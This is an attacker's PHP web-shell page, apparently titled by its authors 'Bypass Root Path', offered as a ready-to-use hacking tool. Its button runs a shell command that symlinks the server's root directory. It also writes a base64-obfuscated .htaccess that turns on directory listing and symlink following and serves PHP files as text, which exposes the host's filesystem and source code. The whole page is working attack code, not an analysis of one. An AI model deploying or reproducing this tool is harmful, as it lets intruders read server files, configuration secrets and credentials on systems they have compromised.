<head>
<title>Bypass Root Path by Mauritania Attacker & Virusa Worm</title>
</head>
<link rel="shortcut icon" href="http://www.iconj.com/ico/c/u/cu1bmpgb1k.ico" type="image/x-icon" />
<style type="text/css"><!-- body {background-color: #151515; font-family:Courier	
margin-left: 0px; margin-top: 0px; text-align: center; New;font-size:12px;color:#009900;font-weight:400;} 
a{text-decoration:none;} a:link {color:#009900;} a:visited {color:#008080;} a:hover{color:#ff0000;} a:active {color:#00a2a2;} 
--><!-- Made By Mauritania Attacker --></style>
<br><br><body bgColor="151515"><tr><td>
<?php 
echo "<form method='POST' action=''>" ; echo "
<center><input type='submit' value='Bypass it' name='Donnazmi'></center>"; 
if (isset($_POST['Donnazmi'])){ system('ln -s / Donnazmi.txt'); 
$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Donnazmi = symlink("/","Donnazmi.txt"); 
$rt="<br><a href=Donnazmi.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
Bypassed Successfully</b></font></a>"; 
echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";  ?></td></tr></body></html>